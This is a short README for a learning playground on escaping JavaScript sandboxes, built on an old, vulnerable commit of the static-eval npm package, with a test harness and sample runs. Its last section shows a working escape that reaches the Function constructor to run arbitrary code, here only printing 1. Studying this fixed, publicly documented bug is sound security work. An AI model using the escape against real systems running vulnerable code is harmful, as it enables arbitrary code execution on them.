# JS Sandbox Escape - Playground

This Playground is based on different JS Sandbox technique an it useful to improve Sandbox escaping technique


## static-eval 
- Project 
    - [static-eval](https://www.npmjs.com/package/static-eval) cloned from following commit 
        ```
        git clone git@github.com:browserify/static-eval.git
        git checkout c0e719f6b689b5c0f9fc84125741509891ac10ca
        ```
        Following vulnerability was fixed as described on [static-eval PR-18](https://github.com/browserify/static-eval/pull/18)
- Reference
    -   [maustin.net - Unsafe Code Execution in static-eval](https://maustin.net/articles/2017-10/static_eval?source=post_page---------------------------)

### Build
```
npm install
```

### Test Case 
```
$ cat eval.js 
var evaluate = require('../index.js');
var parse = require('esprima').parse;

var src = process.argv.slice(2).join(' ');
var ast = parse(src).body[0].expression;

console.log(evaluate(ast));
```

### Normal Sandboxed Execution
- math
```
node eval.js '1+1'
2

```
- console.log
```
node eval.js 'console.log(1)'
undefined
```


### Sandbox Escape Exploit Example
- console.log

```
node eval.js '(function () {}).constructor("console.log(1)")()'
1
```